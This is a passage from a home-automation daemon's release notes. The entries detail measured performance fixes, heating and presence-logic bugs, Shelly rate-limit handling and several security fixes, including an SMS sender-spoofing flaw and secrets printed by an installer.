is the one thing that thread must never do. It goes to a worker now, newest
copy wins. The ten-minute walk through what others know about an address, and
the building of a message's words, are off the quarter-second clock and off
whatever fired them for the same reason: 324 ms and 96 ms respectively, and a
message built the whole house twice over because its words and its title each
asked afresh.

**What the house's own event log knew.**

**Forty-two critical alerts said somebody was inside while nobody was home.
Every one of them was false.** Thirty fell in a single 67.7-hour window: one
phone's Wi-Fi dropped off at 06:08 on 12 October, the controller kept
answering, the phone was never seen again — and "nobody is home" stayed true
for three days while the alerts traced the owner walking through his own hall,
sensor by sensor, and sent fourteen text messages about it. The controller
*answering* was taken as knowledge about a person it had never once found. The
daemon had the missing fact all along: its own reason string reads "not seen
once since the daemon started", and nothing but the dashboard ever read it.
A watched person must now have been found at least once — by the controller or
by their phone's own report — before the house claims to know who is in; until
then a gate that turns on knowing stays shut rather than guessing the house is
empty. And the silence is not left unexplained: once a day, naming them, the
house says that the controller is answering but has never found them, and what
to do about it.

**A cascade of criticals from one message is one alarm.** Ten rules point at
one critical message whose text names the sensor, with no quiet window on it
and no hourly cap on any of the rules: one person walking through the hall
sent **ten criticals and two text messages in 95 seconds**, and nothing
deduplicated anything because all ten texts differed. A critical message with
no window of its own now has a floor of a minute (`crit_quiet_floor_s`),
counted against the message rather than its words. The first one goes out at
once, as it must.

**The same press, reported twice, is one press.** A Shelly BLU button arrives
through more than one gateway, or repeats itself: one button here sent 985
"single" actions, **278 of them in the same second as the one before** — and
the scene behind it is a toggle, so the strip went on and straight back off
and the press looked like it had done nothing at all. A second report of the
same action within three tenths of a second is the same press
(`binding_debounce_ms`, 0 switches it off). Deliberately short: the event log
keeps whole seconds, so the house's own history cannot tell a radio duplicate
from a person pressing again, and three tenths is above the one and well below
the other.

**428 commands failed in a month and the owner was never told once.** The
notification for a light that was asked for and did not come on exists because
three dark rooms were found a day later — and it returns early for a socket
marked "optional", which every one of the eight lights in this house is.
"Optional" means a READING that does not arrive is expected; a COMMAND that
fails is somebody standing in a dark room either way, and it is said now
whatever the socket is marked.

**And the rule log no longer says a light was switched when nothing was sent.**
The switching has always known that a socket already in the asked state needs
no command, and returned without sending — but the line and the event were
written first. Three of this house's rules account for **15,340 such lines,
97% of their own total**: 10,121 of one rule's 10,216 said "Light-Loznice-Main
off" with no command behind any of them. The log is the only way to tell a
working rule from a dead one, so it now records what happened.

**Two things the daemon should have said years ago, and now does.** In the
workshop and the bedroom, the "on when it sees somebody" half of the motion
pair is switched off while the "off when it stops" half is on: motion cannot
turn those lights on at all, and the off halves have run **14,576 times
between them — 68% of every rule firing in the house**. Each rule is valid on
its own and nothing ever looked at two of them together. And five of the six
"off when the motion stops" rules carry no delay, so the light goes out while
somebody is still in the room — measured from the plug log, Light-Satna goes
dark after a median of 38 seconds, 186 of its 197 stretches under a minute.
The hallway rule learnt this and carries fifteen seconds, added by hand after
276 undelayed firings; the lesson was never carried anywhere else. Both are
said out loud now, on save and once at startup, naming the rules and the
hallway's own precedent.

**Ruled out, with the measurement.** The daemon asks Zigbee2MQTT for a network
map every thirty minutes, and its own comment says a scan walks the whole mesh
and a command sent meanwhile waits for it — a good suspect for "the lights
stopped answering for a while and then started again". There is **no trace of
it** in the house's own data: the two chattiest sensors have a median gap of
20 seconds between readings over a fortnight and **not one long gap**. And the
first step of the rate-limit ladder (0.35 s) could be shortened to save about
0.7 s on the 1.8 rate-limit failures a day this house sees — left alone,
because there is no way to try it against a real Shelly's own rate limiter
from here and guessing at it could spend the very requests the light needs.

**Still the biggest thing left, and it is not ours to do.** All 23 of this
house's Shelly boxes report `mqtt.connected: false`: they are driven over
HTTP, one round trip of about 200 ms per command, with 393 outages in a month
behind that. The prefixes are already filled in on this side, the daemon
already sends commands over the broker where a box offers it (with an
automatic fall back to HTTP), and the dashboard already has the button that
writes the broker into a box and reboots it. Over the broker a command is one
publish, a strip of four is four publishes in one breath, and the box's own
state arrives the moment it changes instead of at the next reading.

5.13.0 — the lag, measured, from the house's own log.

A log from the house itself — an upgrade, the check it prints and two minutes
of a button being pressed — had four faults in it, and a ninth reading went
after them with a stopwatch rather than a hunch. Everything below was measured,
most of it on the house's own database of that same morning: 280 MB, 2,286,366
readings, 552,807 folded hours, 51,952 events, 65 devices, 1,065 addresses kept
out and 710,834 country ranges. The numbers are the measurements.

**`zigmon check` said the daemon answered in 1592 ms, and it was telling the
truth.** `/api/health` carries the row counts, and the page asks for it on
every refresh. `samples` is `WITHOUT ROWID` keyed (device, key, ts) with no
index on ts of its own, so counting it — and asking for its oldest row — is a
walk of the whole table. Measured on the house's own database as it stands
today, 280 MB and 2,286,366 readings: **914 ms with the file cold** (708 ms to
count the table, 172 ms to find its oldest row) and **228 ms warm**, every
thirty seconds for as long as a dashboard is open. They are counted on a
thread of their own now, and whoever asks is handed what is in hand: the last
count, or the figures the daemon wrote down before it was restarted. On that
same database `/api/health` went from **174 ms to 4.5 ms**. The oldest reading
comes from the hourly table, which is indexed on ts and holds the same history
folded up: 0 ms rather than 172, and the better answer as well as the cheaper
one, by a whole month on this house.

**Seven sockets reported "not polled yet (the daemon just started)".** The
poll round spreads the boxes over half the interval so a dozen answers are not
parsed in the same instant — including the FIRST round, when no box has a
reading at all. Measured on seventeen boxes: the last socket had nothing for
**7.13 s**. Now **1.18 s**. And the spread is a quarter of the round rather
than half from here on, because the house's one unplugged socket costs 5 s of
its own timeout every round: the rounds were running 12-15 s against a 15 s
interval, which is half a second of headroom for a second slow box to eat.

**The coordinator had been critical for 31 days.** It is the radio, not a
device that reports — it publishes nothing of its own, ever — so "silent for"
only counted up: in the check, on its card, and in `{attention_list}`, which
goes out by text and is charged for by the part. Whether the mesh is alive is
the bridge's own state, which is checked on its own and says so the moment it
stops.

**And the check called a socket somebody had unplugged a failure.** The daemon
says of that same socket "treated as unplugged (optional device)" and leaves
its level alone; the check counted it as a problem, so every upgrade of this
house ended with "the check reported problems" and a non-zero exit over a
socket nobody was worried about. The wait for the first poll was dead code
besides: it tested whether a socket was `online`, which is true from the
moment the daemon starts, because the reading stored before the restart stands
in until a fresh one lands. So it never waited for anything.

**Replacing a block list took 709 ms of the only lock this database has, and
was not all-or-nothing either.** The connection is in autocommit, and in
autocommit `executemany` commits every row separately: the house's largest
list is 27,452 ranges, so it was 27,452 transactions and 27,452 appends to the
journal. Ten lists, hourly, is seconds of lock an hour — and while it is held
the writer thread sits on a reading it has been handed and the page waits 940
ms for a status it usually gets in 18. Measured on the house's own database:
the biggest list, 23,445 ranges, took **787 ms as it was and 63 ms as one
transaction**. The country list — 710,834 rows, daily — went from **27.5 s to
8.4 s**, and the worst wait anything else had for the lock from 798 ms to 356.
The proxy's own lines, the Wi-Fi it has seen and the Suricata rules are
written the same way now. And the promise `put_feed` makes in its own first
line is kept at last: a fetch cut off halfway used to leave half a list
standing, matching half of what it should and telling nobody.

**One press of a four-socket scene woke the pages six times.** A strip answers
one command at a time, so the sockets came back about 200 ms apart and each
one woke every open page — a quarter-megabyte of status fetched and the whole
page repainted. Two megabytes and six repaints for one press of one button.
While one action is switching several sockets the wakes are gathered into one,
a quarter of a second after the last socket moved: **two** now, and the
sockets switch in exactly the same 0.81 s. Only a multi-socket action arms it,
and only while it runs — a motion rule, a single press, a door opening are
untouched and still seen at once.

**A note that had been forgotten came back.** Forgetting one drops it from
memory and puts the row's delete on the write queue — and dropping it from
memory sent the very next reader to the table, where the row was still
standing. It was read from there and put back in memory, so September's list
name stood against December's block for as long as the queue took to drain,
which is exactly the moment the page and the text ask about a block that has
just happened. The suite caught this one under load, having passed over it
quietly for a release.

**"occupancy = 1" meant "occupancy < 1".** `=` is not one of the comparisons —
`==` is — and the dashboard refuses to save one that is not, but an import, a
restore or a hand-edited database can hold one, and anything unknown fell
through to "less than". So a rule written that way fired when the sensor went
QUIET and did nothing at all when it saw somebody, which is the opposite of
what it says, with nothing said anywhere. A comparison nobody knows is now
true of nothing, and complained about once.

**And the check that was meant to catch that had been measuring the wrong
edge for six releases.** It wrote the rule with `=` straight into the table,
sent a quiet report and then a report of movement, and timed the light: the
fire caused by the QUIET report landed on the rule worker's thread a
millisecond later and was counted as the answer to the movement. "A PIR seeing
somebody reaches the light in 2 ms" was true of nothing. It now checks that
the quiet report switches nothing, and that movement switches the light on
and not off.

**The browser's side, measured the same way.**

**The Devices table was thrown away and rebuilt on every socket's wattage
report.** The table draws names, kinds, levels, batteries and when a device
was last heard — not watts — but it was signed on the whole device record, and
a socket's reading rebuilt 65 rows, 2,094 nodes and 130 buttons: **27 ms of
script and 12 ms of layout for each report**, about three times every two
seconds, 92% of everything that tab spends, and a press landing there waited behind
it. The rows that have not changed are kept now, the way the cards already
were. Fifteen wattage reports on the house's own data: **444 ms of script,
199 ms of layout and 100 ms of style before — 52 ms, 16 ms and 8 ms after**,
for the same 65 rows and the same 130 buttons. The mesh
tree beside it no longer writes the same tree again, and the "forget a device"
list no longer rebuilds 65 options for nothing.

**One press refreshed the whole page two or three times.** The action asks for
a refresh and the PIN wrapper around it asks again, in the same turn of the
event loop, and the second became a third fetch when the first came back. Each
one is 44-47 ms on wi-fi and 102 ms on LTE. A second ask in the same turn is
the same ask: one press, one fetch. A burst of wakes now takes the gap between
fetches into account as well, instead of each one going out as the last
landed.

**A page left open fetched a quarter-megabyte every five seconds for
nothing.** The long poll answers the moment anything changes, and answers
anyway every 25 s; the five-second interval beside it is the net underneath,
and it was fetching regardless — about 2,880 fetches and a couple of gigabytes
of JSON over an evening, per open tab, which on a phone is radio and battery.
It fetches now only when the poll is failing, or has said nothing for a
minute. And the Approvals tab's own one-second clock no longer re-fetches the
blocked list every five seconds while somebody is only reading it; what a
person does — taking an address off the list, a search, turning a page — still
fetches it at once.

**The energy chart asked 690 questions.** Thirty days of every socket, two SQL
statements each — 55 ms on the house's own database, every single time, and
the page asks again every minute while an energy group is open. A day that has
ended cannot change, so it is worked out once and kept ten minutes: **55 ms to
3 ms**.

**And the blocked list is a megabyte.** With 1,065 addresses on it the answer
is 979,748 bytes and 45 ms of the daemon, and the Approvals tab was asking for
it every five seconds while somebody was only reading the page.

**Ruled out, with the measurement.** The single press queue added in 5.12 was
suspected of making an unrelated press wait behind a slow scene: measured at
**1 ms**, because a scene hands its sockets to a worker and returns. The ~1 s
a four-socket strip takes is the hardware — four HTTP round trips of about
200 ms, one at a time, which is all the box will answer; the daemon's own
share of it is 3 ms. Over the broker the same four are four publishes in one
breath, which the daemon already offers to point out when it sees a box
connected to it. And the dashboard page is NOT served uncompressed, though a
measurement against the test server said so: nginx has `gzip on` and always
compresses HTML, which takes the page from 1.7 MB to 422 KB.

**Still not done, and said so.** The Database tab's own buttons hold the one
lock while they work: optimise 1392 ms, check 1028 ms, prune 1167 ms (which
walks two million readings row by row in Python), back up 373 ms — measured,
and on the house's slower disk they will be half again as long. They are
things somebody presses on purpose and waits for, so they are left for now
rather than rushed; the reading of them can go on a connection of its own the
way the row counts now do. The status is one 343 KB answer and the page
fetches all of it for a change to one socket; the real answer is a smaller
live section or a change list, and that is a rebuild rather than a fix. The
same goes for the 1.4 MB of browser script, whose top-level run is one 103-127
ms block right after the page first paints — its parse is only 21 ms, so
splitting the file would not be the fix either; moving the wiring of tabs
nobody is looking at off the first run would be.

5.12.0 — everything the house knows, and everything it can be told.

Three things at once: a seventh read through for faults, the facts opened up
from 205 to **308**, and the two holes in the switching closed. An eighth
reading went over this release's own changes as a stranger would, and found
nine faults in them — they are in here too, with the rest.

**The facts: 103 new ones.** The house knew all of this and would tell nobody.
Among them: what the sockets are drawing (`{power_biggest}`, `{power_trend}`,
`{mains_voltage}`, `{socket_temp_max}`, `{longest_on}`, `{plugs_stale}`,
`{still_on}`), what it has used (`{kwh_today}`, `{cost_today}`,
`{kwh_yesterday}`, `{top_sockets}`, `{month_days_left}`), the heating room by
room (`{rooms_why}`, `{heating_gap}`, `{windows_open_rooms}`, `{rooms_held}`,
`{valves_low}`), who is in and how it is known (`{home_since}`,
`{leaving_in}`, `{presence_known}`, `{wifi_ok}`), the modem in detail
(`{modem_temp}`, `{sms_band}`, `{sms_registration}`, `{sms_inbox}`,
`{sms_cap_left}`, `{sms_rsrp}`), the guard (`{watchlist}`, `{near_block}`,
`{blocked_last_country}`, `{suricata_last}`, `{feeds_failing}`), the mesh
(`{bridge_version}`, `{permit_join}`, `{holds}`, `{alert_last}`), and the
machine (`{db_rows}`, `{disk_free_mb}`, `{load_average}`, `{host_uptime}`,
`{write_queue}`). Nothing in a fact starts a count: anything that costs a
query is worked out at most twice a minute and never by a message, because
the messages card asks for nine of these on every draw.

**Six facts were wrong rather than missing.** `{busiest_radio}` and
`{wifi_points}` read `self.wifi['aps']`, which nothing anywhere ever sets —
the access points live one level down — so both were empty on every house
with a working controller, and `{wifi_points}` disagreed with `{wifi_aps}`
beside it by construction. `{power_peak_today}` and `{power_week_peak}` read
only the nightly hourly fold, which ends two hours back, so "the most today"
could not include today's last two hours and was empty outright on a restored
database; the chart beside them has blended the two for releases. With no
price set, every money figure came back as a confident **0** — "this month: 0
Kč" on a house with seventy kilowatt-hours of history — rather than as not
known. `{uptime}` was written twice in two different formats, the second
quietly winning. `{mikrotik_synced}` lived only in memory, so it was blank
after every restart, and was not gated on there being a router at all, so it
contradicted `{mikrotik_list}`. `{sunrise_in}` was empty all day and
`{sunset_in}` from sunset to midnight, so "the sun sets in {sunset_in}" ended
mid-sentence every evening; both now say how long until the next one.
`{cpu_temp}` read `thermal_zone0` alone — right on a Pi, where it is the
processor, and usually something else anywhere else — and the alert on a hot
processor had the identical blind spot; both now look for the processor by
name and fall back to hwmon. And the counts no longer disagree with their own
lists: `{plugs_on}` counted the lights that `{plugs_on_list}` leaves out, so
"3 sockets on: Plug-UPS" was a reachable sentence, and `{devices_quiet}` and
`{quiet_list}` counted different populations. An empty list says **"none"**
everywhere now rather than "nothing", "nobody" or nothing at all — "{home} is
in" used to come out as " is in" — and a long one says how many it left out,
which matters because `{attention_list}` quietly listed all thirty-five and
cost two text messages of money.

**Two holes in the switching, closed.**

A **script** could be run by a text message, a one-tap link and the object
view, and by nothing else. It is the one place where a value can be worked
out rather than written down, so no rule, scene, schedule, button or presence
trigger could reach the only part of the house that can think. Every editor
offers them now, and what set the script off is handed to it, so it can read
`{device}`, `{value}` and `{room}`.

And **an action may now read its value from somewhere else**: `set:{outside_c}`
on a valve, `set:{Obyvak.temperature}` on another room, `set:{lux}` on a
dimmer. Only a script filled the facts into its own line before, and nothing
could reach a script — so "set the bedroom valve to what the living room
reads" was unreachable twice over. A filled-in name can never become a target
of its own, which is the guard a script already kept.

**And the prepared reports are something anything can ask for.** `tell`
passed validation everywhere and then did nothing at all outside a one-tap
link, so a rule or a schedule saved with it was accepted and silent for ever.
Named — `tell:house`, `tell:cost`, `tell:wrong` — it is a message the house
sends itself, so "at seven, how the house is, by text" is one schedule row.

**Four more things the house could already do and nothing could ask it to:**
`sys:energy` (the month's energy summary, which until now went out on the
first at nine and nowhere else), `sys:left_on` (what is still on — it only
ever fired as the last person left, so "at 23:30, if anything is on, tell me"
was unreachable), `sys:feeds` (fetch the block lists), and `sys:sleep` (hold
the texts, by hand).

**Automatic texts have quiet hours of their own.** There was no time-of-day
gate on a text anywhere: the only silence was a hand hushing every road for
every kind, so "do not text me at night, but do push me" could not be said.
`sms_quiet_from` and `sms_quiet_to` hold a text until the morning — in the
outbox, not in the bin — while ntfy and Telegram go out as they always did,
and a critical alert still wakes the phone, because that is what critical
means. A window over midnight is read as one.

**And an automatic text is cut where a message ends.** A part is 160 plain
characters and **70** as soon as one accented letter appears; an alert was cut
at a flat 320, which in Czech is five parts and five parts of somebody's
money. One part for an ordinary alert, two for a critical one, and it says it
was cut.

**Nine faults in the scenes, the sequences, the links and the scripts.**

A **scene may name a sequence and a sequence's step may name a scene**, and a
scene refuses only to name a scene — so a ring of two was savable in both
editors and **ran for ever on one press**, writing an event per turn until
somebody restarted the daemon. Measured on 5.11.0: 5,089 events in two
seconds and still going. The thread ceiling never caught it, because each hop
finishes before the next begins and nothing is ever concurrent. The count
travels with the chain now, four deep at most.

**"On for ten minutes" in a scene switched the socket off.** Two steps on one
box go out through a single worker, in order — and that road went straight to
the switching, which reads anything that is not "on" as off. So a scene
saying "on for ten minutes" turned two sockets on the same box **off** and
set no timer, while the same scene with one socket per box did as it was told.

**A scene fired by a rule walked over a hand.** A hold belongs to a light,
and looking for one on the scene found nothing, so the scene's members were
switched with the flag off. Pressing the hall button to take the landing lamp
over stopped a motion rule aimed at the lamp and did nothing at all against
the same rule aimed at a scene that holds it.

**Ten presses of a switched-off link locked the address out of every link.**
The secret was right, so it was never a guess — but it was counted as one, and
on the eleventh press every other link from that phone was refused for a
minute and an anomaly was filed against the household's own address.

**The "three deep" limit on scripts was one shared number.** Two scripts
running at once read and restored each other's value: two overlapping link
presses had one refused for nesting three deep when neither was more than one
deep, and four at once left the number permanently raised, so from then on
**every** script that called a script was refused until the daemon was
restarted. It belongs to the thread, and now lives there.

Also: the sequence editor offered "notify me" as a step and writing it was
then refused, in words that read as if the thing had been deleted a moment
after it was picked from the list; every schedule read as a raw hex id
wherever it was something to switch (`the schedule 96c96eb5`, four of them
indistinguishable) and now says when, what and to what; a link that runs a
script or bans an address said **never used** on its card for ever, with its
own presses listed in the log immediately below; and a sequence's object card
showed a position past the end of its own step list.

**What the eighth reading found in this release's own work.** Two of them were
bad. A stray comma and a duplicated line left **the whole dashboard dead** —
`php -l` reads the PHP and never looks inside the megabyte of browser script,
so the page served its shell and then nothing: no tabs, no data, no buttons.
There is now a check that reads the page's own script and refuses the release
if it does not parse. And the device-row cache, given a ten-minute life on the
strength of its stamp, **froze a device that had gone quiet for ten minutes** —
the clock is part of that answer, because the age, the level and "silent for
1 min" all come from it. Then: "when nobody is home" fired right after every
restart in a house whose presence is the phone shortcuts, because the setting
was taken as knowledge and the knowledge does not survive a restart (the
house knows once it has been told); keeping the whole of a multi-line text
stopped the built-in commands working, because "status" followed by a
signature matched nothing (a command is read from the first line); two presses
in quick succession could land in the wrong order, because a group went to a
thread and a single press ran inline — every press goes through one worker
now, in order, and a fault in one is said out loud rather than left as a
traceback in the journal; a never-block range written the way a person writes
one, `192.168.1.1 - 192.168.1.20`, was torn into three by the new whitespace
splitting and spared nothing in the middle; the batch-folding added to make a
redraw cheaper was quadratic in the wrong way - it cost what it saved, within
three milliseconds either way on every batch the house actually produces, and
ran away only on a shape none of them has (thousands of nodes none of which
contains another). It now walks up from each node instead of comparing every
pair, which is faster than both the fold and the sweep it replaced in every
shape measured: 0.4 ms against 17.6 and 19.9 on 2,508 nested nodes, 2.0 ms
against 11.6 and 9.2 on 1,300 unnested ones. Dropping the sockets from the
sensor grid's
change-signature saved nothing, because the device list carries a row per
socket too; and clearing a block's notes lost to the deferred write queue, so
the old note landed after the delete and came back. Lastly, a rule or binding
whose target has gone is marked "(gone)" rather than silently re-pointed —
right — but the daemon then refused the whole card without saying which row,
so the card says it first, by number.

**Ruled out, with the measurement.** "Enable the motion group for an hour" was
reported as impossible; it already works, because the timed actions are
expanded before the kind of target is looked at — `for:2s` on a sensor group
switches it on and off again, confirmed.

5.11.0 — a sixth read through: thirty-two faults, and the press that waited.

Five readings at once — the daemon for faults, the daemon for time, the page
for faults, the page for time, and the whole of the network and security side
— and every one of the things below was reproduced before it was touched. The
worst of them were not visible at all: nothing on the dashboard said the
heating was running the wrong days, or that the attack counting had stopped
working, or that a text message could be sent in somebody else's name.

**The clock in a log belongs to whoever wrote it.** `[17/Sep/2026:00:15:34
+0200]` was read with the offset thrown away, as if it were this machine's own
time. The daemon and the server in front need not share a zone: with the
daemon in UTC and the proxy logging +0200, every fresh line looked two hours
in the future, failed the "is this sensible" guard and was **thrown away**. On
a real captured minute — 445 lines, one address knocking 444 times — that is
445 moments read against **0**, 69 notes raised against 1, one address kept
out against none. The other way round the lines were filed two hours in the
past and the hour-long windows never found them. Suricata's eve.json and the
full JSON log had the same fault. All three now read the offset in the line.

**A text message could be sent in somebody else's name.** The gateway's
plain-text inbox was read by testing every line of a message against the
header names, so the second line of a message could say `Sender: +420…` and
be believed — and which number a message came from is the only thing standing
between a stranger and the house's commands. A header is now read once, the
first time it appears, and once the message has begun every line of it is the
message. That also keeps the rest of a message that runs over more than one
line, which used to be thrown away.

**Two places said a secret out loud.** `install.sh --dry-run` — the mode whose
whole promise is that it changes nothing and only says what it would do —
printed the broker password, into a terminal people paste into bug reports.
And `tools/snort-debug.py`, whose header asks for everything it prints to be
sent back, printed the own-address setting whole, query string and any key in
it included; the daemon has stripped exactly that from the same setting for
releases. Both now print `********` and `?…` instead. The debug tool also
waits on the ledger the daemon keeps of what it has asked snort.org, rather
than spending the same five-a-minute budget behind its back and earning the
day-long block it exists to diagnose.

**The heating ran the wrong days.** Every written form of a day counts from
Monday, because that is what the words mean; a plan is stored counting from
Sunday, because that is what the Heating tab writes and what the plan reader
reads. The two were stored and read as if they agreed, so `07:00 comfort
mon-fri`, typed in the object view or sent as a message, actually ran **Sunday
to Thursday**: Friday morning never warmed up and Sunday warmed up for
nothing. A plan made on the tab read back in the object view as the wrong
days.

**And it heated through the weekend it was told to be off.** When today had no
step yet, the plan looked back exactly one day and then gave up and used eco.
A Mon-Fri plan ending in `22:00 off` left Saturday off correctly, found
nothing for Sunday *or* Saturday, and fell through to eighteen degrees — all
Sunday and until Monday's first step, with the plan saying off throughout. It
now looks back as far as it needs to.

**An open window stopped the heating only if it was the first sensor.** The
loop answered on the first sensor in the room that had anything to say, open
or shut — so a bedroom with a balcony door and a side window was decided by
whichever of the two came first, and the door shut said the room was shut
while the radiator heated the open window. Only an open window answers now.

**Away overrode Max.** Away is a temperature and it replaces the temperatures;
Off has always been exempt, and Max — added last release — was not. Pressing
Max while an away schedule was running held the room at sixteen and the card
said "away" the moment after, so the button looked like it did nothing.

**A room now says whether it is calling for heat.** Four places asked a room
whether it was "calling" and nothing ever wrote the word, so
`{Loznice.calling}`, `{rooms_heating}` and the answer a text message gets all
said no in a room four degrees short; `{Loznice.window}` read a name the room
did not use, so it was always no even with the window open and the heating
stopped because of it.

**"Half a degree more" on a room did nothing.** The dashboard offers the nudge
for any target that is a number, which includes a room's temperature — the one
target whose name the value-reader did not know, so it found no room and the
nudge was dropped with a line in the log. A knob bound as a thermostat dial is
the use this exists for.

**`zigmon heating` showed a dash for every room.** It read a field the API has
never sent; the answer calls it something else. Two of the command's three
columns were dashes.

**A house with no Wi-Fi controller knew nobody was in.** A gated rule going
quiet when a controller is set up and not answering is right. A house whose
presence comes from the phone shortcuts alone was treated the same way: the
chip was green, "anybody home" agreed, and every rule with an *only when* gate
was silent for ever — including *when nobody is home*, which is the one that
switches the heating off.

**A rule whose target had gone was silently re-pointed at a person.** Delete a
scene a rule used and the dropdown fell back to the first thing in the list,
which sorts to a person's presence — and the page wrote that back into the
rule without a word. Save anything on that card and the rule really was about
a person. Plans and scenes have guarded this for releases; rules and bindings
had not. A target that has gone is now kept on the list, marked *(gone)*.

**The Settings card froze the first time Control was opened.** Two of its
editors said "unsaved changes" while being built, before anybody touched
anything, and the card refuses to redraw while it is unsaved — so a setting
changed from the CLI, from a phone, or by *Fetch them now* never appeared
again for the rest of the session. The note was wiped at the end of the same
pass, so nothing said why.

**A dropdown's explanation was frozen at whatever it was drawn with.** All 513
of them: change a rule's source and the page's own panel — and a screen reader
— still read out the old one, which is exactly the case a tooltip on a narrow
select exists for.

**Also:** the "needs attention" tile said 35 and the dialog it opened said 48,
and the thirteen it left out were the unreachable sockets and the broker;
*Move to section* in a row's menu did nothing if the list repainted while the
menu was open, and still said "unsaved changes"; the `{tomorrow}` and
`{yesterday}` examples in the Facts picker were worked out in UTC while the
daemon fills them in local time, so for part of each day they were a day out
and `{today}` and `{tomorrow}` read as the same date; a filter that matched
nothing said "1–0"; a never-block entry that was not a bare address or a CIDR
was kept as written and compared to an address as a string, which no address
can equal — so an office or monitoring address spared by a space, a dash range
or a star was not spared at all, could be blocked, and was sent to Shodan (all
four forms are read now, and anything still unreadable says so); what was
written about a block — which list knew the address, which rule fired — is
written afresh for each new block, so an address flagged in September and
blocked again in December for something else no longer carries September's
reason; the country list holds off after a failure instead of trying twice
every thirty seconds for ever (2,880 times a day, two sixty-megabyte downloads
each); and a Suricata rule that is not in the rules file is asked for once a
week rather than re-grepped over SSH on every sweep for ever.

**What was made faster.** The push path was already quick — a report wakes a
waiting page in **1.2 ms** and a press answers in **4 ms** carrying the new
state — so the time was elsewhere:

- **A press now moves the screen in the same frame.** A heating preset, Max, a
  scene, a form's Save: all of them sat still through a POST and then a whole
  status fetch — **235 ms on a phone over a slow link with nothing whatsoever
  moving**. The button is marked chosen at once and the redraw that follows
  the answer paints the truth over it, which is what a socket's tile has done
  since 2.x.
- **A press on every socket no longer deafens the daemon.** A binding naming
  all of them fanned out on the broker's own callback thread — a thread
  started per socket from that thread, each going straight into HTTP — and the
  broker thread lost the processor to them for **26 ms and more**, during
  which nothing from the house was handled at all. Measured here: **10.5 ms →
  0.6 ms**. One socket still fires inline, because that is the common press.
- **The sensor cards stopped redrawing when a socket reports its wattage.**
  They shared a change-signature with the overview, so two dozen sockets
  reporting several times a second rebuilt all 1,321 nodes of the sensor grid
  each time — **97 ms on a phone**, for numbers neither that tab nor the
  buttons tab shows.
- **The first load no longer fetches the status twice.** It is inlined in the
  page the server built and drawn from there, and then it was fetched again at
  once: a third of a megabyte and the first drawing of the visible tab done
  twice, **52 ms of a phone's first load**.
- **A state change carries the numbers waiting behind it.** Numbers wake the
  pages together, at most twice a second; a state change wakes them at once.
  In a busy house there is nearly always a number's timer running, so a press
  was followed within half a second by a second wake for numbers the page had
  already fetched — another quarter-megabyte fetched and another repaint for
  nothing.
- **The title sweep after a redraw** walked each of the 180 elements a rebuilt
  card had added, calling `querySelectorAll` **410 times for one tick**; it now
  sweeps the one container that was replaced.
- **Every device row stopped being rebuilt twice a minute.** The cache that
  holds them expired on a thirty-second timer as well as on its stamp, though
  the stamp already covered everything that can change the answer — except two
  things, which are in it now, so the timer is a guard again rather than a
  rebuild on the dashboard's own path.

**Not done, and why.** Two of the measured costs are worth having and are
rebuilds rather than fixes, so they are written down here instead: splitting
the 1.1 MB of script so a phone's first load is not a painted-but-dead shell
for 640 ms, and patching the device and socket rows in place instead of
rebuilding all 65 of them when one device reports (127 ms on a phone, 2,508
nodes). Both touch everything; nothing in this release does.

5.10.0 — "Max", the level that is not a temperature.

A room has always been put on a temperature somebody chose - comfort, eco,
night - or on **Off**, which is not a temperature at all: the valve shut, held
at five degrees so the pipes do not freeze. **Max** is Off's opposite, and the
one thing the heating could not be told to do: no temperature to hold, the
valve simply **wide open** and the room heated as hard as the head will take.

- **A new level, `max`**, beside comfort, eco, night and off. It asks each
  head in the room for the highest setpoint that head itself admits to - the
  `max` the device reports, thirty degrees where it reports none - so a head
  is never asked for more than it will accept, and a room with two different
  heads is driven by the one that goes highest.
- **On the page** it is a button on every room card, in the card's menu and
  in the head's own dropdown, drawn in warm amber with a flame so it does not
  look like one more temperature. The room then reads "wide open - heating as
  hard as it can, no temperature to hold" rather than "holding the ... ".
- **Everywhere a level is spoken or written**: `heat <room> max`, a plan step
  (`06:30 max mon-fri, 08:00 eco`), the SMS reply, the object view's mode, and
  the completer's suggestions. It stays on until something else is chosen -
  a plan, a hand, or another level - exactly as Off does.

5.9.0 — three dark rooms, and why a box said "too many requests".

On 16 October 2026 at 23:50 the kitchen, the hall and the entrance all failed
to light. Each PIR tripped, each rule fired, and each command came back from
its box as **HTTP 429 - too many requests**. The command was tried twice
inside a second and a quarter and then **dropped**: the lights simply never
came on. Two minutes later everything worked again by itself.

What was actually happening: a reading is retried patiently - two seconds,
then four, then six - and those retries go to the same box. A box counts
requests per second, so the reading nobody was waiting on was spending the
very requests the press needed, and a press that found the box busy gave up
long before the reading did. Nothing of it was on the dashboard: the poll's
retries are logged at debug, and a command that failed was one warning line
in the log.

- **A command somebody is waiting on now keeps asking** for as long as the
  new `plug_command_patience_s` allows (five seconds by default), with the
  waits growing and the box's own `Retry-After` honoured where it sends one.
  A box that refuses for two seconds no longer costs anybody a light; a box
  that never stops refusing is still given up on, so no thread is held.
- **A reading gives way at once.** While a command is in the air for a box,
  or has just gone to it, a poll that is refused does not retry at all - it
  comes round again on the next round, fifteen seconds later, which is what
  a reading is for.
- **A box that has just said "too many requests" is left alone** for a few
  seconds, so what it has left to answer with goes to the press rather than
  to a reading. One round skipped at most.
- **A light that was asked for and did not come on is on the page**, as an
  event beside that socket - and a box that refuses three times in five
  minutes says so once, under a new alert, "A socket did not take a command".
  This is how three dark rooms were found a day later rather than at once.

Also: snort.org's terms form now answers 422, which was a line in the log
every hour. It is read as what it is - the terms need accepting in a browser
again - said once, and not asked again for a day; the ranges already held go
on being used meanwhile.

5.8.0 — a fifth read through, for faults and for what costs time.

The worst thing in it: **every save of the Settings card failed**. One setting
was written as a yes-or-no in a form the saver does not take, so the save
asked a type for its first element, raised, answered 500 and wrote nothing -
and the page posts every box it draws, so this was every save from the
dashboard. It is a switch now, and a save goes through and stays.

What made the house late:

- **Saying somebody has left ran on the broker's own thread.** It asks the
  Wi-Fi controller whether they really have - three seconds, behind a lock of
  the same - and a button press reaches it there, so for up to six seconds no
  sensor report, no other press and no light confirming itself was handled.
  It runs on a thread of its own now, as everything else a press does
  already did; switching a rule, a schedule or a section of buttons off from
  a press does too, because each of those writes a whole list to the database.
- **A Wi-Fi controller that cannot be reached was asked once per gated rule,
  per reading.** The moment of the attempt was only written down when it
  succeeded, so "the last answer is older than four seconds" stayed true for
  ever: five gated rules meant fifteen seconds of timeouts for one report,
  with every reading behind it waiting - including the beat that finishes
  every "must hold for ten minutes" rule.
- **A device list saved from the dashboard could stop a press dead.** Thirty
